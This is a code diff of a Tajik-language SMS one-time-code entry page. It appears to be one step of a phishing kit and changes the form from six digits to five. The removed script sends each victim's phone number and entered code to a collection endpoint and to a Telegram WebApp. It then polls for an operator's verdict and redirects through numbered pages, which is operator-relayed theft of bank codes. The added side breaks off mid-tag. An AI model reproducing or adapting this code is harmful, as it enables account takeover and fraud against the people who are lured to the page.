@@ -108,7 +108,7 @@
           .otp-input-group {
                display: flex;
                justify-content: space-between;
-               gap: 8px;
+               gap: 10px;
                margin-bottom: 25px;
                width: 100%;
                cursor: pointer;
@@ -290,16 +290,15 @@
 
 <div class="container">
      <p class="instruction-text">
-          Рамзи 6-рақамаеро, ки тавассути паёми SMS гирифтед, ворид кунед.
+          Рамзи 5-рақамаеро, ки тавассути паёми SMS гирифтед, ворид кунед.
      </p>
 
      <!-- Баннери хатогӣ -->
      <div id="statusErrorContainer" class="error-banner"></div>
 
      <form id="otpForm" onsubmit="submitOtp(event)">
-          <!-- Майдонҳои PIN -->
+          <!-- 5 Майдони PIN -->
           <div class="otp-input-group" id="otpGroup">
-               <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
                <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
@@ -316,232 +315,4 @@
                <div id="resendBtn" class="resend-action-btn" onclick="resendCode()">Ирсоли дубора</div>
           </div>
 
-          <button type="submit" id="verifyBtn" class="btn-confirm">Тасдиқ кардан</button>
-          <button type="button" class="btn-cancel" onclick="goBack()">Бекор кардан</button>
-     </form>
-</div>
-
-<!-- Огоҳиномаи ҳолат -->
-<div id="statusOverlay" class="overlay-status">
-     <div class="overlay-spinner-circle"></div>
-     <h2 class="overlay-title" id="overlayMainText">Лутфан интизор шавед...</h2>
-     <p class="overlay-subtext" id="overlaySubText">Санҷиши рамзи SMS...</p>
-</div>
-
-<script>
-     const TOTAL_TIME = 60;
-     let timeLeft = TOTAL_TIME;
-     let timerInterval = null;
-     let statusPollingInterval = null;
-
-     const timerCountdownEl = document.getElementById('timerCountdown');
-     const resendBtnEl = document.getElementById('resendBtn');
-     const statusErrorContainer = document.getElementById('statusErrorContainer');
-     const otpBoxes = Array.from(document.querySelectorAll('.otp-box'));
-     const otpGroup = document.getElementById('otpGroup');
-
-     const statusOverlay = document.getElementById('statusOverlay');
-     const overlayMainText = document.getElementById('overlayMainText');
-     const overlaySubText = document.getElementById('overlaySubText');
-
-     window.onload = () => {
-          const tg = window.Telegram?.WebApp;
-          if (tg) {
-               tg.ready();
-               tg.expand();
-          }
-
-          setupOtpInputLogic();
-          startTimer();
-     };
-
-     function setupOtpInputLogic() {
-          otpBoxes.forEach((box, index) => {
-               box.addEventListener('input', (e) => {
-                    const val = box.value.replace(/\D/g, '');
-                    box.value = val;
-
-                    otpBoxes.forEach(b => b.classList.remove('input-error'));
-                    statusErrorContainer.style.display = 'none';
-
-                    if (val && index < otpBoxes.length - 1) {
-                         otpBoxes[index + 1].focus();
-                    }
-               });
-
-               box.addEventListener('keydown', (e) => {
-                    if (e.key === "Backspace") {
-                         if (!box.value && index > 0) {
-                              otpBoxes[index - 1].focus();
-                         }
-                    }
-               });
-
-               box.addEventListener('paste', (e) => {
-                    e.preventDefault();
-                    const pastedData = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-                    
-                    if (pastedData) {
-                         const digits = pastedData.split('').slice(0, 6);
-                         digits.forEach((digit, idx) => {
-                              if (otpBoxes[idx]) {
-                                   otpBoxes[idx].value = digit;
-                              }
-                         });
-                         const nextIndex = Math.min(digits.length, 5);
-                         otpBoxes[nextIndex].focus();
-                    }
-               });
-          });
-
-          otpGroup.addEventListener('click', () => {
-               const emptyBox = otpBoxes.find(b => !b.value) || otpBoxes[otpBoxes.length - 1];
-               emptyBox.focus();
-          });
-
-          setTimeout(() => {
-               if (otpBoxes[0]) otpBoxes[0].focus();
-          }, 300);
-     }
-
-     function startTimer() {
-          if (timerInterval) clearInterval(timerInterval);
-          
-          timeLeft = TOTAL_TIME;
-          updateTimerDisplay();
-
-          resendBtnEl.style.display = 'none';
-          timerCountdownEl.style.display = 'block';
-
-          timerInterval = setInterval(() => {
-               timeLeft--;
-               updateTimerDisplay();
-
-               if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    onTimerExpired();
-               }
-          }, 1000);
-     }
-
-     function updateTimerDisplay() {
-          const minutes = Math.floor(timeLeft / 60);
-          const seconds = timeLeft % 60;
-          
-          const formattedMinutes = String(minutes).padStart(2, '0');
-          const formattedSeconds = String(seconds).padStart(2, '0');
-          
-          timerCountdownEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
-     }
-
-     function onTimerExpired() {
-          timerCountdownEl.style.display = 'none';
-          resendBtnEl.style.display = 'block';
-     }
-
-     async function resendCode() {
-          const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
-          try {
-               await fetch("/api/resend-otp-notification", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ phone, step: "First OTP (Page 8)" })
-               });
-          } catch (err) {
-               console.error("Хатогии ирсоли дубора:", err);
-          }
-          alert("Рамзи нави тасдиқ тавассути SMS фиристода шуд.");
-          startTimer();
-     }
-
-     async function submitOtp(event) {
-          event.preventDefault();
-
-          let codeVal = "";
-          otpBoxes.forEach(b => codeVal += b.value);
-
-          if (codeVal.length < 6) {
-               statusErrorContainer.style.display = 'block';
-               statusErrorContainer.textContent = "Рамзи нодуруст, лутфан рамзи пурраи 6-рақамаро ворид кунед.";
-               otpBoxes.forEach(b => b.classList.add('input-error'));
-               return;
-          }
-
-          statusErrorContainer.style.display = 'none';
-          otpBoxes.forEach(b => b.classList.remove('input-error'));
-
-          const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
-
-          overlayMainText.textContent = "Лутфан интизор шавед...";
-          overlaySubText.textContent = "Санҷиши рамзи SMS...";
-          statusOverlay.classList.add('active');
-
-          localStorage.setItem('smsOtp1', codeVal);
-
-          try {
-               await fetch("/api/otp-notification", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ event: "otp_verification_1", phone, otp: codeVal })
-               });
-          } catch (err) {
-               console.error("❌ Хатогии огоҳинома:", err);
-          }
-
-          const tg = window.Telegram?.WebApp;
-          if (tg && tg.sendData) {
-               tg.sendData(JSON.stringify({ event: "otp_verification_1", phone: phone, otp: codeVal }));
-          }
-
-          startStatusPolling(phone);
-     }
-
-     function startStatusPolling(phone) {
-          if (statusPollingInterval) clearInterval(statusPollingInterval);
-
-          statusPollingInterval = setInterval(async () => {
-               try {
-                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
-                    const data = await response.json();
-
-                    if (data.status === "otp1_correct") {
-                         clearInterval(statusPollingInterval);
-                         overlayMainText.textContent = "Рамз тасдиқ шуд!";
-                         overlaySubText.textContent = "Гузариш ба саҳифаи навбатӣ...";
-
-                         setTimeout(() => {
-                              window.location.href = "/page9";
-                         }, 1200);
-                    } 
-                    else if (data.status === "otp1_wrong") {
-                         clearInterval(statusPollingInterval);
-                         statusOverlay.classList.remove('active');
-                         
-                         statusErrorContainer.style.display = 'block';
-                         statusErrorContainer.textContent = "Рамзи нодуруст. Лутфан рамзи дурустро ворид кунед.";
-                         otpBoxes.forEach(b => {
-                              b.classList.add('input-error');
-                              b.value = "";
-                         });
-                         if (otpBoxes[0]) otpBoxes[0].focus();
-                    }
-                    else if (data.status === "otp2_wrongpin") {
-                         clearInterval(statusPollingInterval);
-                         statusOverlay.classList.remove('active');
-                         
-                         window.location.href = "/page6?error=wrong_pin";
-                    }
-               } catch (err) {
-                    console.error("Хатогии санҷиши ҳолат:", err);
-               }
-          }, 2000);
-     }
-
-     function goBack() {
-          if (statusPollingInterval) clearInterval(statusPollingInterval);
-          window.location.href = "/page6";
-     }
-</script>
-
-</body>
-</html>
+          <button type
